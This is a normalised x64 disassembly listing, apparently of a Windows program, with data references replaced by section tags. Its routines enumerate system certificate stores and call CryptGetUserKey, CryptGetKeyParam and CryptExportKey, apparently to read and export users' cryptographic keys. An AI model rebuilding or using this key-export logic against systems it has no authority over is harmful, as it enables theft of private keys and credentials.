mov [ rbp - 0x39 ] 0x7
mov [ rbp - 0x41 ] r13
mov [ rbp - 0x51 ] r13w
lea rax [ rbp - 0x51 ]
cmp rax rbx
je r-xdata
test dil 0x1
je r-xdata
and edi 0xfffffffd
cmp [ rbp - 0x11 ] 0x8
jb r-xdata
mov rax [ rbx ]
mov [ rbp - 0x51 ] rax
mov [ rbx ] r13
mov r8 [ rbx + 0x10 ]
inc r8
add r8 r8
mov rdx rbx
lea rcx [ rbp - 0x51 ]
call sub_14003a8c0
jmp r-xdata
mov ebx 0x27
lea rdx [ r--data ]
lea r14 [ rw-data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
lea rdx [ rbp - 0x51 ]
call sub_14000ae70
mov rcx rax
movzx edx bx
call sub_14000fe50
mov [ rbp + 0x17 ] 0x7
mov [ rbp + 0xf ] r13
mov [ rbp - 0x1 ] r13w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp - 0x51 ]
lea rcx [ rbp - 0x1 ]
call sub_140001dd0
lea rdx [ rsp + 0x20 ]
lea rcx [ rbp - 0x1 ]
call sub_140001060
mov rcx r14
test al al
je r-xdata
cmp [ rbp - 0x61 ] 0x8
jb r-xdata
mov [ rbp - 0x11 ] 0x7
mov [ rbp - 0x19 ] r13
mov [ rbp - 0x29 ] r13w
mov rcx [ rbp - 0x29 ]
call j_sub_14003ad04
mov rax [ rbx + 0x10 ]
mov [ rbp - 0x41 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp - 0x39 ] rax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
nop
lea edx [ rbx - 0x1d ]
call sub_1400085e0
mov ebx r13d
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
mov r15d 0x4
test [ rcx + r14 + 0x10 ] 0x6
jne r-xdata
mov [ rbp - 0x61 ] 0x7
mov [ rbp - 0x69 ] r13
mov [ rbp - 0x79 ] r13w
mov rcx [ rbp - 0x79 ]
call j_sub_14003ad04
mov al 0x1
mov rcx [ rbp + 0x27 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xe0 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rcx [ rbp - 0x51 ]
call j_sub_14003ad04
movsxd rcx [ rax + 0x4 ]
add rcx r14
test ebx ebx
je r-xdata
mov rcx [ rcx + r14 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove ebx r15d
mov rax [ rw-data ]
mov ecx 0x20
call sub_14003ac60
mov rdi rax
test rax rax
je r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rdi r13
mov [ rax ] r13
mov [ rax + 0x8 ] r13
mov [ rax + 0x10 ] r13
jmp r-xdata
xor r8d r8d
call sub_140003120
or edx r15d
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x1 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
mov rcx r14
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
mov rbx [ rdi ]
cmp rbx [ rdi + 0x8 ]
je r-xdata
lea r9 [ sub_140001490 ]
mov r8 rdi
xor edx edx
mov ecx [ rsp + 0x20 ]
call [ CertEnumSystemStore@IAT ]
test eax eax
je r-xdata
test rdi rdi
je r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_14003ad04
mov edx 0x9
mov rcx r14
call sub_14000fe50
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov r12 rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov esi r13d
mov rcx [ r12 ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + r12 + 0x10 ] 0x6
jne r-xdata
cmp [ rbp - 0x39 ] 0x8
jb r-xdata
mov rcx rdi
call sub_1400070d0
mov rcx rdi
call j_sub_14003ad04
jmp r-xdata
mov rax [ r12 ]
movsxd rcx [ rax + 0x4 ]
add rcx r12
test esi esi
je r-xdata
mov rcx [ rcx + r12 + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
cmove esi r15d
add rbx 0x28
cmp rbx [ rdi + 0x8 ]
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx esi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
xor r8d r8d
call sub_140003120
or edx r15d
sub_140016770
mov rax rsp
push rbp
lea rbp [ rax - 0x5f ]
sub rsp 0xe0
mov [ rbp - 0x39 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x47 ] rax
mov rbx rcx
mov esi 0x7
mov [ rbp + 0xf ] rsi
xor edi edi
mov [ rbp + 0x7 ] rdi
mov [ rbp - 0x9 ] di
xor r8d r8d
lea edx [ rsi + 0x17 ]
lea rcx [ rbp - 0x9 ]
call sub_1400025a0
lea r11 [ rbp - 0x9 ]
cmp [ rbp + 0xf ] 0x8
cmovae r11 [ rbp - 0x9 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov rax [ r--data ]
mov [ r11 + 0x28 ] rax
mov rax [ r--data ]
mov [ r11 + 0x30 ] rax
mov eax [ r--data ]
mov [ r11 + 0x38 ] eax
mov [ rbp + 0x7 ] 0x1e
lea rax [ rbp - 0x9 ]
cmp [ rbp + 0xf ] 0x8
cmovae rax [ rbp - 0x9 ]
mov [ rax + 0x3c ] di
mov [ rbp + 0x37 ] rsi
mov [ rbp + 0x1f ] di
mov eax [ r--data ]
mov [ rbp + 0x1f ] eax
mov [ rbp + 0x2f ] 0x2
lea rax [ rbp + 0x1f ]
cmp rsi 0x8
cmovae rax [ rbp + 0x1f ]
mov [ rax + 0x4 ] di
mov r10 [ rbx ]
mov rcx [ rbx + 0x8 ]
sub rcx r10
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x1
jne r-xdata
cmp rdx 0x2
jne r-xdata
mov rdx r10
lea rcx [ rbp - 0x9 ]
jmp r-xdata
lea rax [ rbp - 0x69 ]
mov [ rbp - 0x41 ] rax
mov [ rbp - 0x51 ] rsi
mov [ rbp - 0x59 ] rdi
mov [ rbp - 0x69 ] di
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x1f ]
lea rcx [ rbp - 0x69 ]
call sub_140001dd0
nop
mov [ rbp - 0x19 ] rsi
mov [ rbp - 0x21 ] rdi
mov [ rbp - 0x31 ] di
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp - 0x9 ]
lea rcx [ rbp - 0x31 ]
call sub_140001dd0
nop
xor r8d r8d
lea rdx [ rbp - 0x69 ]
lea rcx [ rbp - 0x31 ]
call sub_1400178e0
nop
cmp [ rbp + 0x37 ] 0x8
jb r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r10
lea rcx [ rbp - 0x9 ]
call sub_140001dd0
mov rdx [ rbx + 0x8 ]
add rdx 0xffffffffffffffd8
lea rcx [ rbp + 0x1f ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
mov [ rbp + 0x37 ] rsi
mov [ rbp + 0x2f ] rdi
mov [ rbp + 0x1f ] di
cmp [ rbp + 0xf ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1f ]
call j_sub_14003ad04
mov al 0x1
mov rcx [ rbp + 0x47 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xe0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x9 ]
call j_sub_14003ad04
sub_140016990
mov rax rsp
push rbp
lea rbp [ rax - 0x5f ]
sub rsp 0xe0
mov [ rbp - 0x39 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x47 ] rax
mov rbx rcx
mov esi 0x7
mov [ rbp + 0xf ] rsi
xor edi edi
mov [ rbp + 0x7 ] rdi
mov [ rbp - 0x9 ] di
xor r8d r8d
lea edx [ rsi + 0x17 ]
lea rcx [ rbp - 0x9 ]
call sub_1400025a0
lea r11 [ rbp - 0x9 ]
cmp [ rbp + 0xf ] 0x8
cmovae r11 [ rbp - 0x9 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov rax [ r--data ]
mov [ r11 + 0x28 ] rax
mov rax [ r--data ]
mov [ r11 + 0x30 ] rax
mov eax [ r--data ]
mov [ r11 + 0x38 ] eax
mov [ rbp + 0x7 ] 0x1e
lea rax [ rbp - 0x9 ]
cmp [ rbp + 0xf ] 0x8
cmovae rax [ rbp - 0x9 ]
mov [ rax + 0x3c ] di
mov [ rbp + 0x37 ] rsi
mov [ rbp + 0x1f ] di
mov eax [ r--data ]
mov [ rbp + 0x1f ] eax
mov [ rbp + 0x2f ] 0x2
lea rax [ rbp + 0x1f ]
cmp rsi 0x8
cmovae rax [ rbp + 0x1f ]
mov [ rax + 0x4 ] di
mov r10 [ rbx ]
mov rcx [ rbx + 0x8 ]
sub rcx r10
mov rax 0x6666666666666667
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx 0x1
jne r-xdata
cmp rdx 0x2
jne r-xdata
mov rdx r10
lea rcx [ rbp - 0x9 ]
jmp r-xdata
lea rax [ rbp - 0x69 ]
mov [ rbp - 0x41 ] rax
mov [ rbp - 0x51 ] rsi
mov [ rbp - 0x59 ] rdi
mov [ rbp - 0x69 ] di
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x1f ]
lea rcx [ rbp - 0x69 ]
call sub_140001dd0
nop
mov [ rbp - 0x19 ] rsi
mov [ rbp - 0x21 ] rdi
mov [ rbp - 0x31 ] di
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp - 0x9 ]
lea rcx [ rbp - 0x31 ]
call sub_140001dd0
nop
mov r8b 0x1
lea rdx [ rbp - 0x69 ]
lea rcx [ rbp - 0x31 ]
call sub_1400178e0
nop
cmp [ rbp + 0x37 ] 0x8
jb r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx r10
lea rcx [ rbp - 0x9 ]
call sub_140001dd0
mov rdx [ rbx + 0x8 ]
add rdx 0xffffffffffffffd8
lea rcx [ rbp + 0x1f ]
or r9 0xffffffffffffffff
xor r8d r8d
call sub_140001dd0
mov [ rbp + 0x37 ] rsi
mov [ rbp + 0x2f ] rdi
mov [ rbp + 0x1f ] di
cmp [ rbp + 0xf ] 0x8
jb r-xdata
mov rcx [ rbp + 0x1f ]
call j_sub_14003ad04
mov al 0x1
mov rcx [ rbp + 0x47 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xe0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp - 0x9 ]
call j_sub_14003ad04
sub_140016bb0
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x158 ]
sub rsp 0x230
mov [ rbp - 0x78 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x120 ] rax
movzx r12d dl
mov [ rsp + 0x40 ] dl
movzx r15d cl
mov [ rsp + 0x48 ] cl
xor esi esi
mov [ rsp + 0x70 ] esi
lea rax [ r--data ]
lea rdx [ r--data ]
test cl cl
cmovne rdx rax
mov [ rbp + 0x108 ] 0x7
mov [ rbp + 0x100 ] rsi
mov [ rbp + 0xf0 ] si
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
lea rcx [ rbp + 0xf0 ]
call sub_140001ea0
nop
lea ecx [ rsi + 0x20 ]
call sub_14003ac60
mov r13 rax
test rax rax
je r-xdata
mov r13 rsi
mov [ rax ] rsi
mov [ rax + 0x8 ] rsi
mov [ rax + 0x10 ] rsi
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0xc8 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
mov rcx rbx
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
mov r14d esi
mov rdi [ r13 ]
cmp rdi [ r13 + 0x8 ]
je r-xdata
lea rdx [ r--data ]
lea rbx [ rw-data ]
mov rcx rbx
call sub_14000ac10
mov rcx rax
lea rdx [ rbp + 0xf0 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
movzx edx r15b
mov rcx r13
call sub_140003550
mov r14d 0x4
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
jmp r-xdata
mov r14d 0x4
movzx eax r15b
neg al
sbb r15d r15d
and r15d 0x20
nop [ rax + rax ] ax
test r13 r13
je r-xdata
mov edx 0xa
mov rcx rbx
call sub_1400085e0
mov edi esi
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + rbx + 0x10 ] 0x6
jne r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove ebx eax
cmp [ rbp + 0x108 ] 0x8
jb r-xdata
mov rdi [ r13 ]
test rdi rdi
je r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
mov rcx [ rcx + rbx + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove edi r14d
mov rax [ rw-data ]
xor esi esi
mov [ rsp + 0x60 ] rsi
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rcx [ rbp + 0x120 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x230 ]
mov rbx [ r11 + 0x38 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rcx [ rbp + 0xf0 ]
call j_sub_14003ad04
xor eax eax
mov [ r13 ] rax
mov [ r13 + 0x8 ] rax
mov [ r13 + 0x10 ] rax
mov rcx r13
call j_sub_14003ad04
nop
mov rbx [ r13 + 0x8 ]
cmp rdi rbx
je r-xdata
mov rcx r13
call sub_140007150
lea rdx [ r--data ]
mov rcx rbx
call sub_14000ac10
mov rcx rax
lea rdx [ rbp + 0xf0 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rbx rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov edi esi
mov rcx [ rbx ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rbx + 0x10 ] 0x6
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rdx rdi
mov rdx [ rdi ]
jmp r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
mov rcx [ r13 ]
call j_sub_14003ad04
xor eax eax
mov rax [ rbx ]
movsxd rcx [ rax + 0x4 ]
add rcx rbx
test edi edi
je r-xdata
mov rcx [ rcx + rbx + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
cmove edi r14d
xor r8d r8d
call sub_140003120
or edx 0x4
add rdi 0x28
inc r14d
cmp rdi [ r13 + 0x8 ]
lea rbx [ rw-data ]
jne r-xdata
mov [ rsp + 0x58 ] rsi
lea r8 [ rsp + 0x58 ]
mov edx 0x1
mov rcx [ rsp + 0x60 ]
call [ CryptGetUserKey@IAT ]
test eax eax
je r-xdata
mov [ rsp + 0x20 ] r15d
mov r9d 0xc
xor r8d r8d
lea rcx [ rsp + 0x60 ]
call [ CryptAcquireContextW@IAT ]
test eax eax
je r-xdata
mov [ rdi + 0x18 ] 0x7
mov [ rdi + 0x10 ] rax
mov [ rdi ] ax
add rdi 0x28
cmp rdi rbx
jne r-xdata
mov rcx [ rdi ]
call j_sub_14003ad04
xor eax eax
movzx edx r15b
mov rcx r13
call sub_140005320
test al al
je r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
lea rdx [ r--data ]
mov rcx rbx
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rsi rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
xor r11d r11d
mov ebx r11d
mov rcx [ rsi ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
movzx r15d [ rsp + 0x48 ]
lea rbx [ rw-data ]
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0xc8 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
mov [ rsp + 0x44 ] esi
mov eax 0x4
mov [ rsp + 0x50 ] eax
mov [ rsp + 0x20 ] esi
lea r9 [ rsp + 0x50 ]
lea r8 [ rsp + 0x44 ]
lea edx [ rax + 0x2 ]
mov rcx [ rsp + 0x58 ]
call [ CryptGetKeyParam@IAT ]
test eax eax
je r-xdata
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0xc8 ]
call sub_14000f390
mov rdi rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
mov r14d esi
mov rdi [ r13 ]
cmp rdi [ r13 + 0x8 ]
je r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
xor edx edx
mov rcx [ rsp + 0x60 ]
call [ CryptReleaseContext@IAT ]
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
mov [ rsp + 0x20 ] esi
lea r9 [ rsp + 0x50 ]
lea r8 [ rsp + 0x44 ]
mov edx 0x9
mov rcx [ rsp + 0x58 ]
call [ CryptGetKeyParam@IAT ]
test eax eax
je r-xdata
test [ rsp + 0x44 ] 0x4
lea rbx [ r--data ]
lea rax [ r--data ]
cmovne rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ac10
mov rcx rax
call sub_140007970
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
lea rax [ rbp + 0xa0 ]
mov [ rbp - 0x70 ] rax
test r12b r12b
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov edx [ rsp + 0x44 ]
call sub_140008400
mov rcx rax
call sub_140007970
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
mov eax 0x4
cmove ebx eax
mov rcx [ rsp + 0x58 ]
call [ CryptDestroyKey@IAT ]
jmp r-xdata
xor r12b r12b
mov [ rsp + 0x68 ] rsi
mov [ rsp + 0x4c ] esi
lea rcx [ rbp - 0x60 ]
call sub_140003c20
nop
mov [ rbp + 0xb8 ] 0x7
mov [ rbp + 0xb0 ] rsi
mov [ rbp + 0xa0 ] si
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
lea rcx [ rbp + 0xa0 ]
call sub_140001dd0
nop
lea rcx [ rbp + 0xa0 ]
call sub_140018c60
lea rdx [ r--data ]
lea rcx [ rbp - 0x50 ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp + 0xf0 ]
call sub_14000ae70
mov rcx rax
mov ebx 0x5f
movzx edx bx
call sub_14000fe50
mov rcx rax
mov edx r14d
call sub_140008400
mov rcx rax
movzx edx bx
call sub_14000fe50
mov rcx rax
lea rdx [ rbp + 0xa0 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rbx [ rsp + 0x58 ]
lea rax [ rsp + 0x4c ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] rsi
xor r9d r9d
xor edx edx
lea r8d [ r9 + 0x7 ]
mov rcx rbx
call [ CryptExportKey@IAT ]
test eax eax
je r-xdata
mov [ rbp + 0xb8 ] 0x7
xor esi esi
mov [ rbp + 0xb0 ] rsi
mov [ rbp + 0xa0 ] si
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
lea rcx [ rbp + 0xa0 ]
call sub_140001dd0
nop
xor bl bl
xor r8d r8d
xor edx edx
lea rcx [ rbp - 0x80 ]
call [ rw-data ]
test eax eax
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
lea rdx [ rbp + 0xc8 ]
lea rcx [ rbp - 0x60 ]
call sub_140003da0
mov rbx rax
lea rsi [ r--data ]
test r12b r12b
lea rax [ r--data ]
cmovne rsi rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rsi
call sub_14000ac10
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
mov ecx [ rsp + 0x4c ]
call j_sub_14003ac60
mov [ rsp + 0x68 ] rax
lea rcx [ rsp + 0x4c ]
mov [ rsp + 0x28 ] rcx
mov [ rsp + 0x20 ] rax
xor r9d r9d
xor edx edx
lea r8d [ r9 + 0x7 ]
mov rcx rbx
call [ CryptExportKey@IAT ]
test eax eax
setne al
test al al
jne r-xdata
cmp [ rbp + 0xb8 ] 0x8
jb r-xdata
lea r8 [ rbp + 0xa0 ]
cmp [ rbp + 0xb8 ] 0x8
cmovae r8 [ rbp + 0xa0 ]
movzx eax r15b
neg al
sbb ecx ecx
and ecx 0x20
mov [ rsp + 0x20 ] ecx
xor r9d r9d
lea rdx [ rsp + 0x60 ]
mov rcx [ rbp - 0x80 ]
call [ rw-data ]
test eax eax
sete bl
mov rcx [ rbp - 0x80 ]
call [ rw-data ]
nop
xor r8d r8d
call sub_140003120
or edx 0x4
test r12b r12b
jne r-xdata
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
lea rdx [ rbp + 0xc8 ]
lea rcx [ rbp - 0x60 ]
call sub_140003da0
mov r8 rax
mov edx [ rsp + 0x4c ]
mov rcx [ rsp + 0x68 ]
call sub_1400019f0
movzx r12d al
mov rcx [ rsp + 0x68 ]
lea rcx [ rsp + 0x68 ]
jmp r-xdata
mov [ rbp + 0xb8 ] 0x7
mov [ rbp + 0xb0 ] rsi
mov [ rbp + 0xa0 ] si
test bl bl
je r-xdata
mov rcx [ rbp + 0xa0 ]
call j_sub_14003ad04
cmp [ rbp + 0xb8 ] 0x8
jb r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0xc8 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
call j_sub_14003ad04#2
add rdi 0x28
inc r14d
cmp rdi [ r13 + 0x8 ]
jne r-xdata
mov [ rsp + 0x58 ] esi
mov [ rsp + 0x50 ] esi
mov [ rsp + 0x4c ] esi
mov [ rsp + 0x28 ] esi
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x4
lea r8 [ rsp + 0x4c ]
lea rdx [ r--data ]
mov rcx [ rsp + 0x60 ]
call [ rw-data ]
test eax eax
jne r-xdata
mov [ rbp + 0xb8 ] 0x7
xor esi esi
mov [ rbp + 0xb0 ] rsi
mov [ rbp + 0xa0 ] si
lea rcx [ rbp + 0x38 ]
call sub_140003cd0
lea rax [ r--data ]
mov [ rbp + 0x38 ] rax
lea rcx [ rbp + 0x38 ]
call sub_140037d08
movzx r12d [ rsp + 0x40 ]
mov rcx [ rbp + 0xa0 ]
call j_sub_14003ad04
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
nop
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rsi rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
xor eax eax
mov ebx eax
mov rcx [ rsi ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
jmp r-xdata
mov [ rsp + 0x68 ] esi
mov [ rsp + 0x28 ] esi
lea rax [ rsp + 0x68 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x4
lea r8 [ rsp + 0x58 ]
lea rdx [ r--data ]
mov rcx [ rsp + 0x60 ]
call [ rw-data ]
test eax eax
jne r-xdata
cmp [ rsp + 0x50 ] 0x4
jne r-xdata
test r12b r12b
je r-xdata
cmp [ rsp + 0x68 ] 0x4
jne r-xdata
movzx eax [ rsp + 0x4c ]
and al 0x1
lea rbx [ r--data ]
lea rax [ r--data ]
cmovne rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ac10
mov rcx rax
call sub_140007970
mov rcx [ rsp + 0x60 ]
call [ rw-data ]
xor r12b r12b
mov [ rsp + 0x78 ] rsi
mov [ rsp + 0x44 ] esi
lea rax [ r--data ]
mov [ rbp - 0x60 ] rax
lea rax [ r--data ]
mov [ rbp - 0x50 ] rax
lea rax [ r--data ]
mov [ rbp + 0x38 ] rax
or [ rsp + 0x70 ] 0x1
lea rdx [ rbp - 0x48 ]
lea rcx [ rbp - 0x60 ]
call sub_140004740
nop
mov rax [ rbp - 0x60 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rbp + rcx - 0x60 ] rax
lea rcx [ rbp - 0x48 ]
call sub_140004aa0
nop
lea rax [ r--data ]
mov [ rbp - 0x48 ] rax
mov [ rbp + 0x28 ] rsi
mov [ rbp + 0x30 ] esi
lea rdx [ r--data ]
lea rcx [ rbp - 0x50 ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp + 0xf0 ]
call sub_14000ae70
mov rcx rax
mov ebx 0x5f
movzx edx bx
call sub_14000fe50
mov rcx rax
mov edx r14d
call sub_140008400
mov rcx rax
movzx edx bx
call sub_14000fe50
mov rcx rax
mov rdx rdi
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rsi [ rsp + 0x60 ]
xor ecx ecx
mov [ rsp + 0x38 ] ecx
lea rax [ rsp + 0x44 ]
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x20 ] rcx
xor r9d r9d
lea r8 [ r--data ]
xor edx edx
mov rcx rsi
call [ rw-data ]
mov ebx eax
test eax eax
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov edx [ rsp + 0x58 ]
call sub_140008400
mov rcx rax
call sub_140007970
mov ecx ebx
call [ SetLastError@IAT ]
test ebx ebx
jne r-xdata
mov ecx [ rsp + 0x44 ]
call j_sub_14003ac60
mov [ rsp + 0x78 ] rax
xor r11d r11d
mov [ rsp + 0x38 ] r11d
lea rcx [ rsp + 0x44 ]
mov [ rsp + 0x30 ] rcx
mov edx [ rsp + 0x44 ]
mov [ rsp + 0x28 ] edx
mov [ rsp + 0x20 ] rax
xor r9d r9d
lea r8 [ r--data ]
xor edx edx
mov rcx rsi
call [ rw-data ]
mov ebx eax
test eax eax
je r-xdata
lea rdx [ rbp + 0xc8 ]
lea rcx [ rbp - 0x60 ]
call sub_140003da0
mov rbx rax
lea rsi [ r--data ]
test r12b r12b
lea rax [ r--data ]
cmovne rsi rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov rdx rsi
